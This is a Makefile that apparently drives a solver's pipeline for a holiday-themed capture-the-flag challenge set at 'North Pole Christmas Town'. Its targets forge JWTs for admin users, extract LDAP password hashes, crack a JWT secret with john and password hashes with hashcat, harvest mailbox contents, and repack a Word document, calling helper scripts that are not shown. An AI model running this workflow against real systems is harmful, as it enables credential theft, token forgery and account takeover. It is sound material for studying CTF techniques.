all: mail/all.txt hints.md infractions.json infractions_one_per_line.json alabaster.jwt santa.jwt password_hashes.txt jwt.john john.txt gingerbread\ cookie\ recipe.docx password_combos.txt
infractions.json: ../tools/nppd.py
	../tools/nppd.py

infractions_one_per_line.json: infractions.json
	cat infractions.json | jq '.[]' -c | sort > infractions_one_per_line.json

hints.md: ../output/tokens.json ../tools/show_hints.py
	../tools/show_hints.py ../output/tokens.json > hints.md

alabaster.jwt:
	python3 ../tools/make_jwt.py alabaster.snowball Engineering elf > alabaster.jwt

santa.jwt:
	python3 ../tools/make_jwt.py santa.claus administrators human > santa.jwt

edb.json: ../tools/edb.py
	../tools/edb.py > edb.json

password_hashes.txt: edb.json
	cat edb.json |jq '.[][][]' -c|grep userPassword | jq '"\(.mail[0]):\(.userPassword[0])"' -r > password_hashes.txt

jwt.john: ../tools/jwt2john.py jwt
	python3 ../tools/jwt2john.py $(shell cat jwt) > jwt.john

john.txt: jwt.john
	john  --format=HMAC-SHA256 jwt.john
	john  --format=HMAC-SHA256 jwt.john -show > john.txt

mail/alabaster.snowball@northpolechristmastown.com.json: edb.json
	../tools/export_all_email.py edb.json

mail/all.txt: mail.json
	for x in  mail/*.json ;do cat $$x | jq '.INBOX[].BODY.body' -r ;done > mail/all.txt

mail/admin@northpolechristmastown.com.json:
	../tools/ewa.py admin > mail/admin@northpolechristmastown.com.json

mail/reindeer@northpolechristmastown.com.json:
	../tools/ewa.py reindeer > mail/reindeer@northpolechristmastown.com.json

all_emails:
	cat mail/*|grep -io '[a-z\.][a-z\.][a-z\.]*@northpolechristmastown.com'  |sort -u |tee all_emails

gingerbread\ cookie\ recipe.docx: ../tools/repack_word_doc.sh
	../tools/repack_word_doc.sh

password_combos.txt: ../tools/gen_password_combos.py
	../tools/gen_password_combos.py > password_combos.txt
	wc -l password_combos.txt

ldap_hashcat.txt: password_hashes.txt password_combos.txt
	hashcat -m 0  -a 1 password_hashes.txt password_combos.txt  password_combos.txt -j ' ' --username || true
	hashcat -m 0  -a 1 password_hashes.txt password_combos.txt  password_combos.txt -j ' ' --username --show | tee ldap_hashcat.txt

humans.txt:
	http  --proxy=http:socks5://@localhost:31080  http://nppd.northpolechristmastown.com/humans.txt --download

punchcard.txt:
	../tools/humans.py

decode_punchcard: punchcard.txt
	php ../tools/show_punchard.php
